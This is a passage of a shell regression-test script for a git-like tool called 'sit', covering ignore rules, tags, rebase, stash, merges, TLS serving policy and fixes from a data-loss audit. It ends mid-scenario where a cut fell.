# 14c. The targeted DELETE embeds the path in SQL, so a quote in a filename
# must be escaped rather than terminating the string literal.
R="$WORK/s28quote"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'q\n' > "it's.txt"
"$SIT" add "it's.txt" >/dev/null
"$SIT" commit -m c1 >/dev/null
assert_contains "$("$SIT" status)" "nothing to commit" \
  "a single quote in a filename round-trips through the index"
assert_contains "$("$SIT" fsck)" "0 bad" "repo with a quoted filename is structurally clean"

# 14d. parse_index no longer asks patra for ORDER BY, so sit's own merge sort
# is what produces path order. Staging in reverse must still yield sorted
# status output.
R="$WORK/s28order"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
for f in zeta.txt mid.txt alpha.txt beta.txt; do
  printf 'x\n' > "$f"; "$SIT" add "$f" >/dev/null
done
ORDERED=$("$SIT" status | grep -o '[a-z]*\.txt' | head -4)
assert_eq "$(printf '%s' "$ORDERED" | tr '\n' ' ')" "alpha.txt beta.txt mid.txt zeta.txt" \
  "index entries are path-sorted without patra ORDER BY"

# ── 15. S-29 (1.4.9 ignore-file completeness) ──────────────────────
hr "S-29 regressions (info/exclude + nested ignore files)"

# 15a. <repo-dir>/info/exclude is consulted, and the top-level ignore file
# overrides it (git's precedence: last match wins, info/exclude is parsed
# first).
R="$WORK/s29exclude"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
mkdir -p .sit/info
printf 'secret.txt\n' > .sit/info/exclude
printf 'x\n' > secret.txt
printf 'x\n' > normal.txt
assert_eq "$("$SIT" status | grep -c 'secret.txt')" "0" \
  "info/exclude hides secret.txt"
assert_contains "$("$SIT" status)" "normal.txt" "info/exclude does not hide everything"
printf '!secret.txt\n' > .sitignore
assert_contains "$("$SIT" status)" "secret.txt" \
  "a top-level '!' rule overrides info/exclude"

# 15b. A nested ignore file applies only under its own directory.
R="$WORK/s29nested"; mkdir -p "$R/sub/deep"; cd "$R"
"$SIT" init >/dev/null
printf 'x\n' > root.tmp
printf 'x\n' > sub/a.tmp
printf 'x\n' > sub/deep/d.tmp
printf 'x\n' > sub/b.txt
printf '*.tmp\n' > sub/.sitignore
OUT=$("$SIT" status)
assert_contains "$OUT" "root.tmp" "nested rule does NOT reach the repo root"
assert_eq "$(printf '%s' "$OUT" | grep -c 'sub/a.tmp')" "0" \
  "nested rule ignores a sibling under its directory"
assert_eq "$(printf '%s' "$OUT" | grep -c 'sub/deep/d.tmp')" "0" \
  "nested rule reaches deeper paths"
assert_contains "$OUT" "sub/b.txt" "nested rule does not over-match"

# 15c. A deeper ignore file overrides a shallower one.
printf '!d.tmp\n' > sub/deep/.sitignore
assert_contains "$("$SIT" status)" "sub/deep/d.tmp" \
  "deeper '!' rule re-includes what the shallower rule ignored"

# ── 16. Annotated + signed tags (1.5.0) ────────────────────────────
hr "annotated + signed tags (1.5.0)"

R="$WORK/tag150"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'one\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c1 >/dev/null
C1=$(tr -d '\n' < .sit/refs/heads/main)
printf 'two\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c2 >/dev/null
C2=$(tr -d '\n' < .sit/refs/heads/main)

# A lightweight tag still points straight at the commit.
"$SIT" tag lw >/dev/null
assert_eq "$(tr -d '\n' < .sit/refs/tags/lw)" "$C2" "lightweight tag points at the commit"

# An annotated tag points at a TAG OBJECT, not the commit.
"$SIT" tag -a ann -m "annotated" >/dev/null
ANN=$(tr -d '\n' < .sit/refs/tags/ann)
assert_eq "$([ "$ANN" != "$C2" ] && echo ok || echo same)" "ok" \
  "annotated tag ref points at a tag object, not the commit"
assert_contains "$("$SIT" cat-file "$ANN")" "type commit" "tag object carries a type header"
assert_contains "$("$SIT" cat-file "$ANN")" "tag ann" "tag object carries its name"
assert_contains "$("$SIT" cat-file "$ANN")" "object $C2" "tag object names the commit"

# Commands that need a commit peel the tag; cat-file does not.
assert_contains "$("$SIT" log ann --oneline)" "c2" "log peels an annotated tag"
assert_eq "$("$SIT" merge-base ann HEAD)" "$C2" "merge-base peels an annotated tag"
assert_contains "$("$SIT" show ann)" "commit $C2" "show peels an annotated tag"

# 16b. REACHABILITY: a commit reachable ONLY through an annotated tag must not
# be reported dangling. Pre-1.5.0 the fsck walk treated a tag object as a leaf,
# so `--prune-now` DELETED the tagged commit and its tree.
R="$WORK/tagreach"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'one\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c1 >/dev/null
B1=$(tr -d '\n' < .sit/refs/heads/main)
printf 'two\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c2 >/dev/null
"$SIT" tag -a rel -m "tagged" >/dev/null
printf '%s\n' "$B1" > .sit/refs/heads/main
rm -rf .sit/logs                    # drop reflog protection: the walk is all that is left
assert_contains "$("$SIT" fsck)" "0 dangling" \
  "a commit reachable only through an annotated tag is not dangling"
"$SIT" fsck --prune-now >/dev/null 2>&1
assert_contains "$("$SIT" fsck)" "0 bad" "prune-now does not delete a tagged commit"
assert_contains "$("$SIT" log rel --oneline)" "c2" "the tagged commit is still readable after prune"

# 16c. Signed tags.
R="$WORK/tagsign"; mkdir -p "$R"; cd "$R"
export HOME="$WORK/tagsign-home"; mkdir -p "$HOME"
"$SIT" init >/dev/null
printf 'x\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c1 >/dev/null
"$SIT" key generate >/dev/null 2>&1
"$SIT" tag -s sig -m "signed" >/dev/null
assert_contains "$("$SIT" verify-tag sig)" "good signature on tag sig" "signed tag verifies"
"$SIT" tag -a plain -m "unsigned" >/dev/null
assert_contains "$("$SIT" verify-tag plain)" "no signature" "unsigned annotated tag reports no signature"
"$SIT" tag light >/dev/null
assert_contains "$("$SIT" verify-tag light 2>&1)" "not an annotated tag" \
  "lightweight tag is refused by verify-tag"
assert_contains "$("$SIT" fsck)" "0 bad" "repo with signed + unsigned tags is clean"

# ── 17. sit mv + sit describe (1.5.0) ──────────────────────────────
hr "sit mv + sit describe (1.5.0)"

R="$WORK/mv150"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'hello\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c1 >/dev/null
BLOB_BEFORE=$("$SIT" fsck | grep -oE 'checked [0-9]+' | grep -oE '[0-9]+')
"$SIT" mv a.txt b.txt >/dev/null
assert_eq "$([ -f b.txt ] && [ ! -f a.txt ] && echo ok)" "ok" "mv renames on disk"
assert_contains "$("$SIT" status)" "b.txt" "new path is staged"
assert_contains "$("$SIT" status)" "a.txt" "old path is staged as deleted"
"$SIT" commit -m rename >/dev/null
assert_eq "$(cat b.txt)" "hello" "content survives the rename"
# The blob must be REUSED, not rehashed into a second object: 1 blob, 2 trees,
# 2 commits = 5. A rehash would show 6.
assert_eq "$("$SIT" fsck | grep -oE 'checked [0-9]+' | grep -oE '[0-9]+')" "5" \
  "mv reuses the existing blob rather than rewriting it"
assert_contains "$("$SIT" fsck)" "0 bad" "repo is clean after mv"

# mv guards: every one of these must refuse and change nothing.
printf 'z\n' > z.txt
assert_contains "$("$SIT" mv nosuch.txt q.txt 2>&1)" "does not exist" "mv refuses a missing source"
assert_contains "$("$SIT" mv b.txt z.txt 2>&1)" "already exists" "mv refuses an existing destination"
assert_contains "$("$SIT" mv b.txt ../escape.txt 2>&1)" "invalid destination" "mv refuses path traversal"
assert_contains "$("$SIT" mv b.txt b.txt 2>&1)" "same path" "mv refuses a no-op rename"
assert_eq "$([ -f b.txt ] && echo ok)" "ok" "a refused mv leaves the source in place"

# An untracked file is not sit's to move.
printf 'u\n' > untracked.txt
assert_contains "$("$SIT" mv untracked.txt moved.txt 2>&1)" "not tracked" "mv refuses an untracked source"

# 17b. describe
R="$WORK/desc150"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
for i in 1 2 3; do printf 'v%s\n' "$i" > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m "c$i" >/dev/null; done
FIRST=$("$SIT" log --oneline | tail -1 | awk '{print $1}')
"$SIT" tag base "$FIRST" >/dev/null
assert_contains "$("$SIT" describe)" "base-2-g" "describe reports tag, distance and short hash"
assert_eq "$("$SIT" describe "$FIRST")" "base" "describe on the tagged commit is the bare tag"
# An annotated tag is peeled, so describe treats both kinds alike.
"$SIT" tag -a head-tag -m "at head" >/dev/null
assert_eq "$("$SIT" describe)" "head-tag" "describe peels an annotated tag"

R="$WORK/desc-none"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'x\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c >/dev/null
assert_contains "$("$SIT" describe 2>&1)" "no tag" "describe with no tags fails cleanly"

# ── 18. History tools: cherry-pick / revert / stash (1.5.1) ────────
hr "history tools: cherry-pick / revert / stash (1.5.1)"

R="$WORK/hist151"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'l1\nl2\nl3\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m base >/dev/null
printf 'x\n' > b.txt; "$SIT" add b.txt >/dev/null; "$SIT" commit -m "add b" >/dev/null
ADDB=$(tr -d '\n' < .sit/refs/heads/main)

# revert must remove the file the reverted commit added — both from the tree
# AND from the working directory.
"$SIT" revert HEAD >/dev/null
assert_eq "$([ ! -f b.txt ] && echo gone)" "gone" "revert removes the file from the working tree"
assert_contains "$("$SIT" log --oneline)" 'Revert "add b"' "revert writes an inverse commit"
assert_contains "$("$SIT" status)" "nothing to commit" "working tree is clean after revert"

# cherry-pick brings it back.
"$SIT" cherry-pick "$ADDB" >/dev/null
assert_eq "$(cat b.txt)" "x" "cherry-pick restores the file and its content"
assert_contains "$("$SIT" fsck)" "0 bad" "repo is clean after revert + cherry-pick"

# A cherry-pick that changes nothing must not create an empty commit.
BEFORE=$("$SIT" log --oneline | wc -l)
"$SIT" cherry-pick "$ADDB" >/dev/null
assert_eq "$("$SIT" log --oneline | wc -l)" "$BEFORE" "a no-op cherry-pick creates no commit"

# 18b. reset --hard / merge stale-file removal (fixed in 1.5.1). Before this,
# materialize_target ran AFTER the ref moved, so its stale-path removal
# compared HEAD against itself and never fired.
R="$WORK/stale151"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'a\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c1 >/dev/null
printf 'b\n' > b.txt; "$SIT" add b.txt >/dev/null; "$SIT" commit -m c2 >/dev/null
"$SIT" reset --hard 'HEAD@{1}' >/dev/null 2>&1
assert_eq "$([ ! -f b.txt ] && echo gone)" "gone" "reset --hard removes a file absent from the target"

# 18c. stash
R="$WORK/stash151"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'orig\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m base >/dev/null
printf 'modified\n' > a.txt
"$SIT" stash >/dev/null
assert_eq "$(cat a.txt)" "orig" "stash restores the working tree to HEAD"
assert_contains "$("$SIT" stash list)" "stash@{0}" "stash list shows the entry"
"$SIT" stash pop >/dev/null
assert_eq "$(cat a.txt)" "modified" "stash pop restores the snapshot"
assert_contains "$("$SIT" stash list)" "no stash entries" "pop empties the stack"
printf 'orig\n' > a.txt      # back to HEAD's content, so the tree is clean
assert_contains "$("$SIT" stash)" "no local changes" "stash with a clean tree is a no-op"

# The stack is LIFO and pop restores newest first.
printf 'v1\n' > a.txt; "$SIT" stash >/dev/null
printf 'v2\n' > a.txt; "$SIT" stash >/dev/null
"$SIT" stash pop >/dev/null; assert_eq "$(cat a.txt)" "v2" "pop restores the newest entry first"
# 1.6.4: with v2 now sitting uncommitted in the tree, a second pop must refuse
# rather than silently discard it (it used to). git refuses here too.
"$SIT" stash pop >/dev/null 2>&1; assert_eq "$?" "1" "pop over uncommitted work refuses"
assert_eq "$(cat a.txt)" "v2" "the refused pop leaves the uncommitted work alone"
"$SIT" reset --hard HEAD >/dev/null 2>&1
"$SIT" stash pop >/dev/null; assert_eq "$(cat a.txt)" "v1" "pop then restores the next one"

# 18d. REACHABILITY: a live stash must survive fsck --prune-now. Pre-1.5.1
# .sit/refs/stash was not a root (it is a file, not a refs directory), so every
# stashed object dangled and prune DELETED the stash.
R="$WORK/stashreach"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'orig\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m base >/dev/null
printf 'modified\n' > a.txt; "$SIT" stash >/dev/null
rm -rf .sit/logs                    # drop reflog protection: the ref walk is all that is left
assert_contains "$("$SIT" fsck)" "0 dangling" "a live stash is reachable from the ref walk"
"$SIT" fsck --prune-now >/dev/null 2>&1
"$SIT" stash pop >/dev/null
assert_eq "$(cat a.txt)" "modified" "the stash survives fsck --prune-now"

# ── 18e. merge argument dispatch (regression, 1.6.2) ───────────────
hr "merge argument dispatch (1.6.2 regression)"

# 1.5.2 added octopus merge on "two or more arguments", which took EVERY
# argument after `merge` as a branch name — so `sit merge <branch> -m <msg>`
# tried to resolve "-m" as a branch. Through 1.7.x `cmd_merge` ignored -m, and
# the CI smoke relied on that since v0.5.x; 1.8.0 honours it (section 35).
R="$WORK/mdisp"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'base\n' > base.txt; "$SIT" add base.txt >/dev/null; "$SIT" commit -m base >/dev/null
"$SIT" checkout -b feature >/dev/null 2>&1
printf 'b\n' > b.txt; "$SIT" add b.txt >/dev/null; "$SIT" commit -m "on feature" >/dev/null
"$SIT" checkout main >/dev/null 2>&1
printf 'm\n' > m.txt; "$SIT" add m.txt >/dev/null; "$SIT" commit -m "on main" >/dev/null
MOUT=$("$SIT" merge feature -m "merge feature" 2>&1); MRC=$?
assert_eq "$MRC" "0" "'merge <branch> -m <msg>' succeeds"
assert_eq "$(printf '%s' "$MOUT" | grep -c "cannot resolve")" "0" \
  "a trailing flag is not mistaken for a branch name"
assert_eq "$("$SIT" cat-file HEAD | grep -c '^parent')" "2" \
  "it produced a normal two-parent merge, not an octopus"
assert_eq "$("$SIT" cat-file HEAD | sed -n '/^$/{n;p;q}')" "merge feature" "and -m names it (1.8.0)"

# The octopus path itself must still fire on two or more REAL branches.
R="$WORK/mdisp2"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'base\n' > base.txt; "$SIT" add base.txt >/dev/null; "$SIT" commit -m base >/dev/null
for b in o1 o2; do
  "$SIT" checkout -b "$b" >/dev/null 2>&1
  printf '%s\n' "$b" > "$b.txt"; "$SIT" add "$b.txt" >/dev/null; "$SIT" commit -m "add $b" >/dev/null
  "$SIT" checkout main >/dev/null 2>&1
done
"$SIT" merge o1 o2 >/dev/null
assert_eq "$("$SIT" cat-file HEAD | grep -c '^parent')" "3" \
  "two real branch names still octopus-merge"

# -S and --abort keep their own dispatch.
assert_contains "$("$SIT" merge --abort 2>&1)" "no merge in progress" "--abort still dispatches"
assert_contains "$("$SIT" merge -S nosuchbranch 2>&1)" "not a known branch" "-S still dispatches"

# ── 19. Wider merge + inspection (1.5.2) ───────────────────────────
hr "octopus merge / blame / dir-only ignores (1.5.2)"

# 19a. Octopus: N branches, one commit with N+1 parents.
R="$WORK/oct152"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'base\n' > base.txt; "$SIT" add base.txt >/dev/null; "$SIT" commit -m base >/dev/null
for b in f1 f2 f3; do
  "$SIT" checkout -b "$b" >/dev/null 2>&1
  printf '%s\n' "$b" > "$b.txt"; "$SIT" add "$b.txt" >/dev/null; "$SIT" commit -m "add $b" >/dev/null
  "$SIT" checkout main >/dev/null 2>&1
done
"$SIT" merge f1 f2 f3 >/dev/null
assert_eq "$("$SIT" cat-file HEAD | grep -c '^parent')" "4" "octopus commit has HEAD + 3 parents"
for b in f1 f2 f3; do
  assert_eq "$([ -f "$b.txt" ] && echo ok)" "ok" "octopus merged $b.txt into the working tree"
done
assert_contains "$("$SIT" fsck)" "0 bad" "repo is clean after an octopus merge"
# The parent order must put HEAD first — first-parent walks depend on it.
assert_contains "$("$SIT" log --oneline)" "Merge branches" "octopus commit is on the first-parent chain"

# 19b. A conflicting octopus refuses and writes NOTHING.
R="$WORK/octconf"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'v0\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m base >/dev/null
H0=$(tr -d '\n' < .sit/refs/heads/main)
"$SIT" checkout -b x >/dev/null 2>&1; printf 'vX\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m x >/dev/null
"$SIT" checkout main >/dev/null 2>&1; "$SIT" checkout -b y >/dev/null 2>&1
printf 'vY\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m y >/dev/null
"$SIT" checkout main >/dev/null 2>&1
OUT=$("$SIT" merge x y 2>&1); RC=$?
assert_eq "$RC" "1" "a conflicting octopus exits non-zero"
assert_contains "$OUT" "merge these pairwise" "and says what to do instead"
assert_eq "$(tr -d '\n' < .sit/refs/heads/main)" "$H0" "HEAD is unchanged after a refused octopus"
assert_eq "$([ ! -f .sit/MERGE_HEAD ] && echo ok)" "ok" "no MERGE_HEAD is left behind"
assert_eq "$(grep -c '<<<<' c.txt || true)" "0" "no conflict markers are written to the working tree"

# 19c. blame
R="$WORK/blame152"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'alpha\nbeta\ngamma\n' > f.txt; "$SIT" add f.txt >/dev/null
SIT_AUTHOR_NAME="Ann" "$SIT" commit -m c1 >/dev/null
C1=$("$SIT" log --oneline | head -1 | awk '{print $1}')
printf 'alpha\nBETA2\ngamma\n' > f.txt; "$SIT" add f.txt >/dev/null
SIT_AUTHOR_NAME="Bob" "$SIT" commit -m c2 >/dev/null
C2=$("$SIT" log --oneline | head -1 | awk '{print $1}')
printf 'alpha\nBETA2\ngamma\ndelta\n' > f.txt; "$SIT" add f.txt >/dev/null
SIT_AUTHOR_NAME="Cid" "$SIT" commit -m c3 >/dev/null
C3=$("$SIT" log --oneline | head -1 | awk '{print $1}')
B=$("$SIT" blame f.txt)
assert_contains "$(printf '%s' "$B" | sed -n '1p')" "$C1" "unchanged first line is attributed to the commit that added it"
assert_contains "$(printf '%s' "$B" | sed -n '2p')" "$C2" "the edited line is attributed to the commit that edited it"
assert_contains "$(printf '%s' "$B" | sed -n '3p')" "$C1" "the line after an edit keeps its original attribution"
assert_contains "$(printf '%s' "$B" | sed -n '4p')" "$C3" "the appended line is attributed to the newest commit"
assert_contains "$(printf '%s' "$B" | sed -n '2p')" "Bob" "blame reports the author"
assert_contains "$("$SIT" blame nosuch.txt 2>&1)" "not tracked" "blame refuses an untracked path"

# 19d. Directory-only ignore rules.
R="$WORK/dironly"; mkdir -p "$R/build"; cd "$R"
"$SIT" init >/dev/null
printf 'build/\n' > .sitignore
printf 'o\n' > build/out.o
OUT=$("$SIT" status)
assert_eq "$(printf '%s' "$OUT" | grep -c 'build')" "0" "build/ ignores the directory"
# The same rule must NOT hide a FILE named build.
R="$WORK/dironly2"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'build/\n' > .sitignore
printf 'i am a file\n' > build
assert_contains "$("$SIT" status)" "build" "build/ does NOT ignore a file named build"

# ── 20. sit rebase (1.5.3) ─────────────────────────────────────────
hr "sit rebase (1.5.3)"

# 20a. Clean rebase: the branch replays onto upstream as new commits.
R="$WORK/rb153"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'base\n' > base.txt; "$SIT" add base.txt >/dev/null; "$SIT" commit -m base >/dev/null
"$SIT" checkout -b feat >/dev/null 2>&1
printf 'f1\n' > f1.txt; "$SIT" add f1.txt >/dev/null; "$SIT" commit -m "feat 1" >/dev/null
printf 'f2\n' > f2.txt; "$SIT" add f2.txt >/dev/null; "$SIT" commit -m "feat 2" >/dev/null
OLD_TIP=$(tr -d '\n' < .sit/refs/heads/feat)
"$SIT" checkout main >/dev/null 2>&1
printf 'up\n' > up.txt; "$SIT" add up.txt >/dev/null; "$SIT" commit -m "upstream work" >/dev/null
"$SIT" checkout feat >/dev/null 2>&1
"$SIT" rebase main >/dev/null
assert_eq "$("$SIT" log --oneline | wc -l)" "4" "rebase produces a linear 4-commit history"
assert_contains "$("$SIT" log --oneline | sed -n '3p')" "upstream work" "upstream sits below the replayed commits"
for f in base.txt up.txt f1.txt f2.txt; do
  assert_eq "$([ -f "$f" ] && echo ok)" "ok" "$f is present after rebase"
done
# History is REWRITTEN: the tip must be a new object.
assert_eq "$([ "$(tr -d '\n' < .sit/refs/heads/feat)" != "$OLD_TIP" ] && echo ok)" "ok" \
  "rebase rewrites commits (new oids)"
assert_eq "$([ ! -f .sit/REBASE_ORIG ] && [ ! -f .sit/rebase-todo ] && echo ok)" "ok" \
  "rebase state files are cleared on success"
assert_contains "$("$SIT" fsck)" "0 bad" "repo is clean after rebase"

# 20b. Conflicting rebase stops, and --abort restores the branch exactly.
R="$WORK/rbconf"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'v0\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m base >/dev/null
"$SIT" checkout -b feat >/dev/null 2>&1
printf 'vFEAT\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m "feat edit" >/dev/null
FEAT_TIP=$(tr -d '\n' < .sit/refs/heads/feat)
"$SIT" checkout main >/dev/null 2>&1
printf 'vMAIN\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m "main edit" >/dev/null
"$SIT" checkout feat >/dev/null 2>&1
"$SIT" rebase main >/dev/null 2>&1
assert_eq "$([ -f .sit/REBASE_ORIG ] && echo ok)" "ok" "a stopped rebase saves its original tip"
assert_eq "$([ -f .sit/rebase-todo ] && echo ok)" "ok" "a stopped rebase saves the remaining todo"
assert_eq "$(grep -c '<<<<' c.txt)" "1" "the conflicting file carries markers"
"$SIT" rebase --abort >/dev/null
assert_eq "$(tr -d '\n' < .sit/refs/heads/feat)" "$FEAT_TIP" "--abort restores the exact branch tip"
assert_eq "$(cat c.txt)" "vFEAT" "--abort restores the working tree"
assert_eq "$([ ! -f .sit/REBASE_ORIG ] && echo ok)" "ok" "--abort clears the state"
assert_contains "$("$SIT" fsck)" "0 bad" "repo is clean after an aborted rebase"

# 20c. Resolve + --continue finishes the rebase.
R="$WORK/rbcont"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'v0\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m base >/dev/null
"$SIT" checkout -b feat >/dev/null 2>&1
printf 'vFEAT\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m "feat edit" >/dev/null
"$SIT" checkout main >/dev/null 2>&1
printf 'vMAIN\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m "main edit" >/dev/null
"$SIT" checkout feat >/dev/null 2>&1
"$SIT" rebase main >/dev/null 2>&1
printf 'resolved\n' > c.txt; "$SIT" add c.txt >/dev/null
"$SIT" rebase --continue >/dev/null
assert_eq "$(cat c.txt)" "resolved" "--continue keeps the resolved content"
assert_eq "$("$SIT" log --oneline | wc -l)" "3" "--continue lands the replayed commit"
assert_contains "$("$SIT" log --oneline | head -1)" "feat edit" "the replayed commit keeps its message"
assert_eq "$([ ! -f .sit/rebase-todo ] && echo ok)" "ok" "--continue clears the todo"
assert_contains "$("$SIT" fsck)" "0 bad" "repo is clean after --continue"

# 20d. Guards.
assert_contains "$("$SIT" rebase --continue 2>&1)" "no rebase in progress" "--continue outside a rebase is refused"
assert_contains "$("$SIT" rebase --abort 2>&1)" "no rebase in progress" "--abort outside a rebase is refused"
# Rebasing onto your own tip has nothing above the merge base. (Rebasing onto a
# plain ancestor is NOT a no-op — the commits above it still replay, which is
# what git does too.)
assert_contains "$("$SIT" rebase feat 2>&1)" "up to date" "rebasing onto the current tip is a no-op"

# ── 21. TLS trust hardening (1.6.0) ────────────────────────────────
hr "TLS trust hardening (1.6.0)"

# 21a. Non-loopback policy needs no certs — always run it.
R="$WORK/tls160"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'x\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c1 >/dev/null
OUT=$("$SIT" serve "$R" --listen 0.0.0.0:18740 2>&1); RC=$?
assert_eq "$RC" "1" "non-loopback plain HTTP is refused"
assert_contains "$OUT" "refusing to serve plain HTTP" "and says why"
assert_contains "$OUT" "--tls" "and says how to fix it"
assert_contains "$("$SIT" serve "$R" --listen nonsense 2>&1)" "requires <ipv4>:<port>" \
  "a malformed --listen is still refused"

if command -v openssl > /dev/null 2>&1; then
  cd "$R"
  openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
    -keyout k.pem -out c.pem -days 2 -nodes -subj "/CN=localhost" \
    -addext "subjectAltName=DNS:localhost" > /dev/null 2>&1

  # 21b. TOFU (the default) accepts a self-signed cert.
  PORT=18741
  "$SIT" serve "$R" --tls --cert c.pem --key k.pem --listen 127.0.0.1:$PORT > /dev/null 2>&1 &
  TP=$!
  trap 'kill $TP 2>/dev/null || true' EXIT
  for _ in 1 2 3 4 5 6 7 8 9 10; do
    if (echo > /dev/tcp/127.0.0.1/$PORT) >/dev/null 2>&1; then break; fi
    sleep 0.5
  done
  export HOME="$R/home"; mkdir -p "$HOME"
  CL="$WORK/tlsclone"; rm -rf "$CL"
  "$SIT" clone --force-absolute "https://localhost:$PORT" "$CL" > /dev/null 2>&1
  assert_eq "$(cat "$CL/a.txt" 2>/dev/null)" "x" "TOFU accepts a self-signed server by default"

  # 21c. http.sslVerify=true refuses that same self-signed cert.
  cd "$CL"
  "$SIT" config http.sslVerify true
  VOUT=$("$SIT" fetch origin main 2>&1)
  assert_contains "$VOUT" "did not verify" "sslVerify refuses an unverifiable chain"
  assert_contains "$VOUT" "http.caBundle" "and names the remedy"

  # 21d. Naming that cert as the CA bundle makes it verify again — this also
  # exercises hostname checking, since the cert's SAN is localhost.
  "$SIT" config http.caBundle "$R/c.pem"
  assert_contains "$("$SIT" fetch origin main 2>&1)" "fetched origin/main" \
    "sslVerify + caBundle accepts a chain that verifies"

  # 21e. Non-loopback WITH --tls is allowed, and the banner reports the real
  # address rather than a hardcoded 127.0.0.1.
  cd "$R"
  "$SIT" serve "$R" --tls --cert c.pem --key k.pem --listen 0.0.0.0:18742 > "$R/banner.out" 2>&1 &
  BP=$!
  for _ in 1 2 3 4 5 6 7 8 9 10; do
    if (echo > /dev/tcp/127.0.0.1/18742) >/dev/null 2>&1; then break; fi
    sleep 0.5
  done
  assert_contains "$(cat "$R/banner.out")" "listening on 0.0.0.0" \
    "non-loopback is allowed with --tls, and the banner is honest about it"
  kill $BP 2>/dev/null || true
  kill $TP 2>/dev/null || true
  trap - EXIT
else
  echo "  (skipped 21b-21e: openssl not available)"
fi

# ── 22. 1.6.4 audit regressions ───────────────────────────────────
# One scenario per data-loss / escape finding of the 2026-10-19 audit, each
# asserting the fixed behaviour; every one of these passed silently (and lost
# or misplaced data) on 1.6.3. See docs/audit/2026-10-19-audit.md.
hr "1.6.4 audit regressions"
trap 'rm -rf "$WORK"' EXIT     # section 21 cleared the cleanup trap
a164() { R="$WORK/a164-$1"; rm -rf "$R"; mkdir -p "$R"; cd "$R"; "$SIT" init >/dev/null; }
c164() { for f in "$@"; do "$SIT" add "$f" >/dev/null; done; }
m164() { "$SIT" commit -m "$1" >/dev/null; }

# A1 — cherry-pick refuses to overwrite an uncommitted edit.
a164 a1; echo a > a.txt; echo b > b.txt; c164 a.txt b.txt; m164 base
"$SIT" branch side >/dev/null; "$SIT" checkout side >/dev/null; echo side > a.txt; c164 a.txt; m164 side
"$SIT" checkout main >/dev/null; echo "UNCOMMITTED" > b.txt
"$SIT" cherry-pick side >/dev/null 2>&1; assert_eq "$?" "1" "A1: cherry-pick over a dirty tree refuses"
assert_eq "$(cat b.txt)" "UNCOMMITTED" "A1: the uncommitted edit survives"

# A2 — replace vs insert at the same base line conflicts, never drops the insert.
a164 a2; printf 'a\nb\nc\n' > f.txt; c164 f.txt; m164 base
"$SIT" branch side >/dev/null; printf 'a\nB\nc\n' > f.txt; c164 f.txt; m164 ours
"$SIT" checkout side >/dev/null; printf 'a\nx\nb\nc\n' > f.txt; c164 f.txt; m164 theirs
"$SIT" checkout main >/dev/null; "$SIT" merge side >/dev/null 2>&1
assert_eq "$?" "1" "A2: replace-vs-insert at one line is a conflict"
assert_contains "$(cat f.txt)" "x" "A2: theirs' inserted line is still there to resolve"

# A3 — a conflicted merge keeps its clean half through resolve + commit.
a164 a3; echo c0 > conf.txt; echo "old other" > other.txt; c164 conf.txt other.txt; m164 base
"$SIT" branch side >/dev/null; echo ours > conf.txt; c164 conf.txt; m164 ours
"$SIT" checkout side >/dev/null; echo theirs > conf.txt; echo "SIDE EDIT" > other.txt; c164 conf.txt other.txt; m164 theirs
"$SIT" checkout main >/dev/null; "$SIT" merge side >/dev/null 2>&1
echo resolved > conf.txt; "$SIT" add conf.txt >/dev/null; "$SIT" commit -m merged >/dev/null 2>&1
"$SIT" reset --hard HEAD >/dev/null 2>&1
assert_eq "$(cat other.txt)" "SIDE EDIT" "A3: the cleanly merged file is in the merge commit"

# A4 — an octopus merge does not undo a change HEAD made after a branch forked.
a164 a4; echo "safe default" > cfg.txt; c164 cfg.txt; m164 R
"$SIT" branch b1 >/dev/null; echo "DANGEROUS" > cfg.txt; c164 cfg.txt; m164 M1
